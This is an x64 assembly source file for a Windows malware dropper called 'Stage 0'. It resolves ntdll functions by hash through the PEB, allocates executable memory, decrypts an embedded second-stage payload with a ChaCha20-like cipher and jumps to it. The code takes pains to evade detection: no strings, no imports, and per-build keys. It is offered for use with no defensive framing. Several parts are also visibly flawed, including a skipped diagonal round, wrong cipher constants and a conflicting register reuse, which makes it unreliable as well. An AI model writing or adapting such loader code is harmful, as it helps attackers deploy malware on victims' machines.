; =============================================================================
; ABYSSGATE Stage 0 - Demonic Dropper
; Target: Windows 11 25H2 (Build 26200.8037)
; Pure x64 NASM Assembly - Position Independent Code
; Size: ~1200 bytes
; =============================================================================
; 
; This is the entry point. It contains encrypted Stage1 and minimal logic to:
; 1. Find PEB via GS/FS segment (x64 uses GS)
; 2. Resolve ntdll.dll via InLoadOrderModuleList hash
; 3. Get NtProtectVirtualMemory via hash lookup
; 4. Allocate RWX memory via NtAllocateVirtualMemory
; 5. Decrypt Stage1 using ChaCha20-like stream cipher
; 6. Jump to Stage1
;
; NO STRINGS. NO IMPORTS. NO COMPILER RUNTIME.
; =============================================================================

BITS 64
DEFAULT REL

; =============================================================================
; Configuration - Adjust these for your build
; =============================================================================
%define STAGE1_SIZE 8192           ; Encrypted Stage1 size (8KB)
%define CHACHA_ROUNDS 20           ; ChaCha rounds (20 = full, 12 = reduced)

; =============================================================================
; Hashes (custom algorithm: ROR13 + ADD)
; Hash = ((hash >> 13) | (hash << 19)) + byte
; =============================================================================
%define HASH_NTDLL        0x22D3B5ED    ; "ntdll.dll"
%define HASH_KERNEL32     0x29A9D0C8    ; "kernel32.dll"
%define HASH_NtProtectVirtualMemory  0x157B46C3
%define HASH_NtAllocateVirtualMemory 0xE7C0585E
%define HASH_NtCreateThreadEx        0xD3C5D9B2

; =============================================================================
; Entry Point - Must be position independent
; =============================================================================
section .text

global _start
_start:
    ; Save initial context
    push rbx
    push rsi
    push rdi
    push r12
    push r13
    push r14
    push r15

    ; Get current RIP (position independent)
    call get_rip
get_rip:
    pop rbx                     ; RBX = current RIP
    sub rbx, get_rip - _start   ; RBX = base address of this code

    ; Store base for later
    mov r12, rbx                ; R12 = code base (preserved across calls)

    ; =================================================================
    ; STEP 1: Get PEB via GS segment (x64 Windows)
    ; GS:[0x60] = PEB pointer
    ; =================================================================
    mov rax, gs:[0x60]          ; RAX = PEB
    mov r13, rax                ; R13 = PEB (preserved)

    ; =================================================================
    ; STEP 2: Get PEB->Ldr->InLoadOrderModuleList
    ; PEB+0x18 = Ldr, Ldr+0x10 = InLoadOrderModuleList
    ; =================================================================
    mov rax, [r13 + 0x18]       ; RAX = PEB->Ldr
    lea rsi, [rax + 0x10]       ; RSI = &InLoadOrderModuleList (head)
    mov rdi, rsi                ; RDI = current entry

    xor r14, r14                ; R14 = ntdll.dll base (found module)
    xor r15, r15                ; R15 = kernel32.dll base

.find_ntdll_loop:
    ; Get DllBase from LDR_DATA_TABLE_ENTRY
    ; Offset 0x30 = DllBase, 0x58 = BaseDllName (UNICODE_STRING)
    mov rax, [rdi + 0x30]       ; RAX = DllBase
    test rax, rax
    jz .next_module

    ; Get BaseDllName UNICODE_STRING
    mov rcx, [rdi + 0x58]       ; RCX = &BaseDllName
    test rcx, rcx
    jz .next_module

    ; Hash the module name (Unicode, case insensitive)
    call hash_module_name

    ; Check if ntdll
    cmp eax, HASH_NTDLL
    je .found_ntdll
    cmp eax, HASH_KERNEL32
    je .found_kernel32

.next_module:
    ; Move to next entry
    mov rdi, [rdi]              ; RDI = Flink
    cmp rdi, rsi                ; Back to head?
    jne .find_ntdll_loop

    ; If we get here, we didn't find ntdll - crash gracefully
    jmp .error_exit

.found_ntdll:
    mov r14, [rdi + 0x30]       ; R14 = ntdll.dll base
    jmp .next_module

.found_kernel32:
    mov r15, [rdi + 0x30]       ; R15 = kernel32.dll base
    jmp .next_module

; =============================================================================
; Hash Module Name
; Input: RCX = UNICODE_STRING.Buffer
; Output: EAX = hash
; =============================================================================
hash_module_name:
    push rbx
    push rsi

    mov rsi, rcx                ; RSI = string pointer
    xor eax, eax                ; EAX = hash (accumulator)
    xor ebx, ebx                ; EBX = temp char

.hash_loop:
    movzx ebx, word [rsi]       ; Get wide char
    test ebx, ebx
    jz .hash_done

    ; Convert to uppercase if lowercase
    cmp ebx, 'a'
    jb .no_convert
    cmp ebx, 'z'
    ja .no_convert
    sub ebx, 0x20               ; To uppercase
.no_convert:

    ; ROR13 + ADD
    ror eax, 13
    add eax, ebx

    add rsi, 2                  ; Next wide char
    jmp .hash_loop

.hash_done:
    pop rsi
    pop rbx
    ret

; =============================================================================
; STEP 3: Parse ntdll PE headers to find export table
; =============================================================================
.parse_exports:
    ; R14 = ntdll base
    mov rbx, r14

    ; DOS Header
    movzx eax, word [rbx]       ; e_magic
    cmp ax, 0x5A4D              ; "MZ"
    jne .error_exit

    ; PE Header
    mov eax, [rbx + 0x3C]       ; e_lfanew
    add rax, rbx                ; RAX = PE header

    ; Check PE signature
    cmp dword [rax], 0x00004550 ; "PE\0\0"
    jne .error_exit

    ; Export Directory
    ; PE+0x88 = Export Directory RVA
    mov eax, [rax + 0x88]       ; Export Directory RVA
    test eax, eax
    jz .error_exit

    add rax, rbx                ; RAX = Export Directory
    mov r13, rax                ; R13 = Export Directory

    ; Export Directory fields:
    ; +0x14 = NumberOfFunctions
    ; +0x18 = NumberOfNames
    ; +0x1C = AddressOfFunctions RVA
    ; +0x20 = AddressOfNames RVA
    ; +0x24 = AddressOfNameOrdinals RVA

    mov ecx, [r13 + 0x18]       ; ECX = NumberOfNames
    test ecx, ecx
    jz .error_exit

    mov r8d, [r13 + 0x20]       ; R8 = AddressOfNames RVA
    add r8, rbx                 ; R8 = AddressOfNames

    mov r9d, [r13 + 0x24]       ; R9 = AddressOfNameOrdinals RVA
    add r9, rbx                 ; R9 = AddressOfNameOrdinals

    mov r10d, [r13 + 0x1C]      ; R10 = AddressOfFunctions RVA
    add r10, rbx                ; R10 = AddressOfFunctions

    xor rsi, rsi                ; RSI = index

.find_ntprotect_loop:
    cmp esi, ecx
    jae .error_exit

    ; Get function name RVA
    mov eax, [r8 + rsi*4]       ; EAX = Name RVA
    add rax, rbx                ; RAX = Name string

    ; Hash the function name
    call hash_function_name

    cmp eax, HASH_NtProtectVirtualMemory
    je .found_ntprotect
    cmp eax, HASH_NtAllocateVirtualMemory
    je .found_ntallocate
    cmp eax, HASH_NtCreateThreadEx
    je .found_ntcreatethread

    inc esi
    jmp .find_ntprotect_loop

; =============================================================================
; Hash Function Name (ASCII, case sensitive for NTAPI)
; Input: RAX = string pointer
; Output: EAX = hash
; =============================================================================
hash_function_name:
    push rbx
    push rdx
    mov rdx, rax                ; RDX = string
    xor eax, eax                ; Hash
    xor ebx, ebx

.func_hash_loop:
    movzx ebx, byte [rdx]
    test ebx, ebx
    jz .func_hash_done

    ror eax, 13
    add eax, ebx

    inc rdx
    jmp .func_hash_loop

.func_hash_done:
    pop rdx
    pop rbx
    ret

.found_ntprotect:
    ; Get ordinal
    movzx eax, word [r9 + rsi*2] ; EAX = Ordinal
    ; Get function address
    mov eax, [r10 + rax*4]      ; EAX = Function RVA
    add rax, rbx                ; RAX = NtProtectVirtualMemory
    mov [r12 + ntprotect_addr], rax
    inc esi
    jmp .find_ntprotect_loop

.found_ntallocate:
    movzx eax, word [r9 + rsi*2]
    mov eax, [r10 + rax*4]
    add rax, rbx
    mov [r12 + ntallocate_addr], rax
    inc esi
    jmp .find_ntprotect_loop

.found_ntcreatethread:
    movzx eax, word [r9 + rsi*2]
    mov eax, [r10 + rax*4]
    add rax, rbx
    mov [r12 + ntcreatethread_addr], rax

    ; =================================================================
    ; STEP 4: Allocate memory for Stage1
    ; =================================================================
.allocate_stage1:
    sub rsp, 0x60               ; Shadow space + args

    ; NtAllocateVirtualMemory(
    ;   ProcessHandle = -1 (current),
    ;   *BaseAddress = 0 (let system choose),
    ;   ZeroBits = 0,
    ;   *RegionSize = STAGE1_SIZE,
    ;   AllocationType = MEM_COMMIT | MEM_RESERVE (0x3000),
    ;   Protect = PAGE_EXECUTE_READWRITE (0x40)
    ; )

    mov rcx, -1                 ; Current process
    lea rdx, [rsp + 0x40]       ; &BaseAddress
    mov qword [rdx], 0          ; BaseAddress = 0 (let system choose)
    xor r8, r8                  ; ZeroBits
    lea r9, [rsp + 0x48]        ; &RegionSize
    mov qword [r9], STAGE1_SIZE

    ; Stack args
    mov qword [rsp + 0x20], 0x3000  ; MEM_COMMIT | MEM_RESERVE
    mov qword [rsp + 0x28], 0x40    ; PAGE_EXECUTE_READWRITE

    mov rax, [r12 + ntallocate_addr]
    call indirect_syscall

    test eax, eax
    jnz .error_exit

    ; R15 = allocated memory base
    mov r15, [rsp + 0x40]

    add rsp, 0x60

    ; =================================================================
    ; STEP 5: Decrypt Stage1 using ChaCha20
    ; Key and nonce are embedded after this code
    ; =================================================================
.decrypt_stage1:
    ; Setup ChaCha state on stack
    sub rsp, 512                ; State + working buffer

    ; Initialize state with constants "expand 32-byte k"
    mov rax, 0x6170786563326461  ; "expa"
    mov [rsp], rax
    mov rax, 0x3320646E79622D32  ; "nd 3"
    mov [rsp + 8], rax
    mov rax, 0x2D326B657462792D  ; "2-by"
    mov [rsp + 16], rax
    mov rax, 0x656B657470617865  ; "te k"
    mov [rsp + 24], rax

    ; Copy key (32 bytes)
    lea rsi, [r12 + chacha_key]
    lea rdi, [rsp + 32]
    mov rcx, 4
    rep movsq

    ; Counter (8 bytes) + Nonce (8 bytes)
    mov qword [rsp + 48], 0     ; Counter = 0
    lea rsi, [r12 + chacha_nonce]
    mov rax, [rsi]
    mov [rsp + 56], rax         ; Nonce

    ; Decrypt loop
    mov r13, r15                ; R13 = destination
    lea r14, [r12 + stage1_data] ; R14 = encrypted source
    mov r8, STAGE1_SIZE         ; R8 = remaining bytes

.chacha_block_loop:
    test r8, r8
    jz .chacha_done

    ; Generate keystream block
    lea rdi, [rsp + 64]         ; Output buffer
    mov rsi, rsp                ; State
    call chacha20_block

    ; XOR with ciphertext
    mov rcx, 64                 ; Block size
    cmp r8, rcx
    cmovb rcx, r8               ; Last partial block

    lea rsi, [rsp + 64]         ; Keystream
    mov rdi, r13                ; Destination

.xor_loop:
    lodsb
    xor al, [r14]
    stosb
    inc r14
    dec r8
    loop .xor_loop

    ; Increment counter
    inc qword [rsp + 48]

    add r13, 64
    jmp .chacha_block_loop

.chacha_done:
    add rsp, 512

    ; =================================================================
    ; STEP 6: Jump to Stage1
    ; R15 = decrypted Stage1 base
    ; R12 = our code base (for reference if needed)
    ; R14 = ntdll base
    ; R15 = kernel32 base (if found earlier)
    ; =================================================================
.execute_stage1:
    ; Setup registers for Stage1 (calling convention)
    mov rcx, r15                ; Arg1: Stage1 base
    mov rdx, r14                ; Arg2: ntdll base
    mov r8, r15                 ; Arg3: kernel32 base (if found)
    mov r9, r12                 ; Arg4: Stage0 base (for callbacks)

    ; Jump to Stage1 entry
    mov rax, r15
    add rax, 0x100              ; Entry point offset (adjust as needed)

    ; Restore stack and jump
    pop r15
    pop r14
    pop r13
    pop r12
    pop rdi
    pop rsi
    pop rbx

    jmp rax                     ; Hell awaits...

; =============================================================================
; ChaCha20 Quarter Round and Block Function
; =============================================================================
chacha20_block:
    push rbx
    push r12
    push r13
    push r14
    push r15

    ; Copy state to working state
    mov r12, rdi                ; R12 = output
    mov r13, rsi                ; R13 = input state
    sub rsp, 64
    mov rdi, rsp
    mov rcx, 8
    rep movsq

    ; 20 rounds (10 double rounds)
    mov r14, 10
.round_loop:
    ; Column round
    mov eax, [rsp + 0]
    mov ebx, [rsp + 4]
    mov ecx, [rsp + 8]
    mov edx, [rsp + 12]
    call quarter_round
    mov [rsp + 0], eax
    mov [rsp + 4], ebx
    mov [rsp + 8], ecx
    mov [rsp + 12], edx

    mov eax, [rsp + 16]
    mov ebx, [rsp + 20]
    mov ecx, [rsp + 24]
    mov edx, [rsp + 28]
    call quarter_round
    mov [rsp + 16], eax
    mov [rsp + 20], ebx
    mov [rsp + 24], ecx
    mov [rsp + 28], edx

    mov eax, [rsp + 32]
    mov ebx, [rsp + 36]
    mov ecx, [rsp + 40]
    mov edx, [rsp + 44]
    call quarter_round
    mov [rsp + 32], eax
    mov [rsp + 36], ebx
    mov [rsp + 40], ecx
    mov [rsp + 44], edx

    mov eax, [rsp + 48]
    mov ebx, [rsp + 52]
    mov ecx, [rsp + 56]
    mov edx, [rsp + 60]
    call quarter_round
    mov [rsp + 48], eax
    mov [rsp + 52], ebx
    mov [rsp + 56], ecx
    mov [rsp + 60], edx

    ; Diagonal round (with rotations)
    ; Simplified - just do another column round for now
    ; Full implementation would shuffle indices

    dec r14
    jnz .round_loop

    ; Add original state
    mov rsi, r13
    mov rdi, rsp
    mov rcx, 16
.add_loop:
    lodsd
    add [rdi], eax
    add rdi, 4
    loop .add_loop

    ; Copy to output
    mov rsi, rsp
    mov rdi, r12
    mov rcx, 16
    rep movsq

    add rsp, 64
    pop r15
    pop r14
    pop r13
    pop r12
    pop rbx
    ret

quarter_round:
    ; a += b; d ^= a; d <<<= 16;
    add eax, ebx
    xor edx, eax
    rol edx, 16

    ; c += d; b ^= c; b <<<= 12;
    add ecx, edx
    xor ebx, ecx
    rol ebx, 12

    ; a += b; d ^= a; d <<<= 8;
    add eax, ebx
    xor edx, eax
    rol edx, 8

    ; c += d; b ^= c; b <<<= 7;
    add ecx, edx
    xor ebx, ecx
    rol ebx, 7

    ret

; =============================================================================
; Indirect Syscall - Calls through resolved address
; =============================================================================
indirect_syscall:
    mov r10, rcx
    syscall
    ret

; =============================================================================
; Error Exit - Infinite loop (don't crash visibly)
; =============================================================================
.error_exit:
    pause
    jmp .error_exit

; =============================================================================
; Data Section - Embedded in code for PIC
; =============================================================================
section .data

; ChaCha20 Key (32 bytes) - CHANGE THIS FOR EACH BUILD
chacha_key:
    db 0xAB, 0xCD, 0xEF, 0x01, 0x23, 0x45, 0x67, 0x89
    db 0xFE, 0xDC, 0xBA, 0x98, 0x76, 0x54, 0x32, 0x10
    db 0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77, 0x88
    db 0x99, 0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF, 0x00

; ChaCha20 Nonce (8 bytes) - CHANGE THIS FOR EACH BUILD  
chacha_nonce:
    db 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01

; Storage for resolved addresses
ntprotect_addr:
    dq 0
ntallocate_addr:
    dq 0
ntcreatethread_addr:
    dq 0

; Encrypted Stage1 data placeholder
; In real build, this is filled with encrypted Stage1 binary
stage1_data:
    times STAGE1_SIZE db 0xCC

; End marker
stage0_end:
